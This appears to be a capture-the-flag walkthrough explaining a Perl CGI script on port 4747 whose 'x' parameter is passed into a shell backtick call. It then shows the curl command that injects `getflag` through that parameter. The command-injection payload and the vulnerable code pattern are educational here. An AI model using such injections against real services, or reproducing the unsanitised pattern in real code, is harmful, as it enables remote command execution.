# First, I will learn a little perl language and decrypt each line of this script:

# localhost:4747 -> The script will run in the background on port 4747

# use CGI qw{param}; -> Import the param function from CGI:: library.

# print "Content-type: text/html\n\n" -> Basic print.

# sub x { -> Function x declaration.

# $y = $_[0]; -> Declaration of the variable '$y', $_[0] means that $y will take the value of the first argument passed to the function.

# print `echo $y 2>&1` -> Basic print of $y.

# x(param("x")) -> Gives to the function x, the value of the parameter 'x'.

# Then, I used curl to see what it displays:

$> curl localhost:4747

# It displays nothing, because x is not defined. So I tried to pass an argument with curl:

$> curl localhost:4747?x="test"

# It displays "test".

# Finaly, I had the idea to pass a shell script as an argument: getflag.

$> curl localhost:4747?x=\`getflag\`

# And There you go !
